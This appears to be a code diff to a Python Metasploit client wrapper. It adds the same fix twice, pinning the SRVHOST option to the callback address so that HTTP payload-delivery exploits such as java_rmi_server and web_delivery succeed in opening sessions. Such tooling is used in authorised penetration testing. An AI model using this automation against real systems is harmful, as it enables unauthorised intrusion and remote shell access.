@@ -793,6 +793,16 @@ class MsfClient:
                 fails += _apply_options(exploit, cred_sets)
             fails += _apply_options(payload, [("LHOST", lhost),
                                               ("LPORT", int(lport))])
+            # HTTP class/stage-delivery exploits (java_rmi_server, web_delivery and
+            # kin) serve the payload from the module's own HttpServer; the target
+            # fetches it from SRVHOST, a separate leg from the LHOST callback. MSF
+            # auto-picks SRVHOST when it is left unset, which resolves to the wrong
+            # interface on a multi-homed or WSL-mirrored host, so the class never
+            # arrives and the exploit returns a clean no_session on every payload.
+            # Pin SRVHOST to the same reachable address the callback already uses.
+            # Gated on the module declaring it, so non-HTTP exploits are untouched.
+            if "SRVHOST" in exploit.options:
+                fails += _apply_options(exploit, [("SRVHOST", lhost)])
             # Required exploit options with no default that are still unset, minus
             # whatever the payload merge will supply. Anything outstanding is
             # module-specific (creds, a target URI with no default, and so on) we
@@ -901,6 +911,16 @@ class MsfClient:
                 fails += _apply_options(exploit, [("RPORT", int(port))])
             fails += _apply_options(payload, [("LHOST", lhost),
                                               ("LPORT", int(lport))])
+            # HTTP class/stage-delivery exploits (java_rmi_server, web_delivery and
+            # kin) serve the payload from the module's own HttpServer; the target
+            # fetches it from SRVHOST, a separate leg from the LHOST callback. MSF
+            # auto-picks SRVHOST when it is left unset, which resolves to the wrong
+            # interface on a multi-homed or WSL-mirrored host, so the class never
+            # arrives and the exploit returns a clean no_session on every payload.
+            # Pin SRVHOST to the same reachable address the callback already uses.
+            # Gated on the module declaring it, so non-HTTP exploits are untouched.
+            if "SRVHOST" in exploit.options:
+                fails += _apply_options(exploit, [("SRVHOST", lhost)])
             supplied = set(payload.runoptions)
             outstanding = [o for o in exploit.missing_required
                            if o not in supplied]
